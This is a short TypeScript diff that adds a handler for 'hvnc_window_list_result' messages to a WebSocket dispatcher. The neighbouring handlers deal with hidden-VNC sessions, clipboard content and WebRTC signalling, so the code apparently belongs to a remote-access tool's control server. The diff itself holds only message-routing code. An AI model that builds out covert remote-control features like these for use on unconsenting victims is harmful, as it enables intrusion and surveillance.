@@ -157,6 +157,7 @@ type WsLifecycleDeps = {
   handleHVNCInstalledAppsResult: (clientId: string, payload: any) => void;
   handleHVNCDXGIStatus: (clientId: string, payload: any) => void;
   handleHVNCBrowserLaunchStatus: (clientId: string, payload: any) => void;
+  handleHVNCWindowListResult: (clientId: string, payload: any) => void;
   handleClipboardContent: (clientId: string, payload: any) => void;
   handleWebrtcP2PAnswer: (clientId: string, payload: any) => void;
   handleWebrtcP2PIce: (clientId: string, payload: any) => void;
@@ -732,6 +733,9 @@ export async function handleWebSocketMessage(
         break;
       case "hvnc_browser_launch_status":
         deps.handleHVNCBrowserLaunchStatus(client.id, payload);
+        break;
+      case "hvnc_window_list_result":
+        deps.handleHVNCWindowListResult(client.id, payload);
         break;
       case "clipboard_content":
         deps.handleClipboardContent(client.id, payload);
